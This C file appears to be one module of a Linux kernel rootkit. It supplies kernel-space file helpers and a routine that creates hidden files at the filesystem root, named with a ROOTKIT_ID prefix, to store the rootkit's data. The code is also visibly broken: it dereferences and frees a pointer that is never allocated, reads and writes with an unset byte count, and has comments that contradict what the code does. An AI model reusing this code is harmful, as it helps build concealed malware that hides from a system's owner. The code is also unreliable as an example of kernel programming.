/*
	file that manages the hidden_dir, including configuration
*/
#include <linux/fs.h>
#include <asm/uaccess.h>

extern char ROOTKIT_ID[];

struct kern_file{ //file holding data for file reading/writing
	struct file *fd; //file descriptor
	loff_t pos;
	size_t count;
    ssize_t ret;
};

static struct kern_file *open_file(char *path, int flags){ //opens file from path
	printk(KERN_DEBUG "in open_file- path = %s\n", path);
	//code from https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
	struct kern_file *file; //file descriptor
    int err = 0; //error code

	printk("opening file...\n");
    file->fd = filp_open(path, flags, 0644); //opens the file in append mode
	printk("opened file...\n");
    if (IS_ERR(file->fd)) { //if file doesnt exist
		printk(KERN_DEBUG "error opening file\n");
		err = PTR_ERR(file->fd); //get error code
		printk(KERN_DEBUG "error = %i\n", err);
		return (struct kern_file*) NULL; //return NULL
    }
    return file; //return file
}

static int file_close(struct kern_file *file){ //close file
	printk(KERN_DEBUG "in file_close\n");
	filp_close(file->fd, NULL); //closes file
	kfree(file); //delete kern_file obj
	return 0; //return 0 for no error
}

static int file_read(struct kern_file *file, void *buf){ //reads data from file
	printk(KERN_DEBUG "in file read\n");
	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
	file->pos = 0;
	kernel_read(file->fd, buf, file->count, &(file->pos));
	return 0; //returns size of file
}

static int file_write(struct kern_file *file, void *buf){ //writes data to file
	printk(KERN_DEBUG "in file write\n");
	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
	file->pos = 0;
	kernel_write(file->fd, buf, file->count, &(file->pos));
	return 0;
}


static struct kern_file *open_hidden_file(char *filename){ //opens file in /bin prepended with ROOTKIT_ID or creates if doesn't exist
	printk(KERN_DEBUG "in open_hidden_file- file = %s\n", filename);
	struct kern_file *hidden_file;

	char *path; //char array to hold name of directory
	path = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
	sprintf(path, "/.%s%s", ROOTKIT_ID, filename); //formats name of directory to be made
	printk(KERN_DEBUG "path = %s\n", path);
	hidden_file = open_file(path, O_APPEND | O_RDWR);
	if (hidden_file==NULL){ //file doesn't exist
		printk(KERN_DEBUG "error creating file\n");
		hidden_file = open_file(path, O_CREAT | O_RDWR);
	}
	if (hidden_file==NULL){ //file doesn't exist
		printk(KERN_DEBUG "error creating file\n");
	}
    return hidden_file; //return file
}
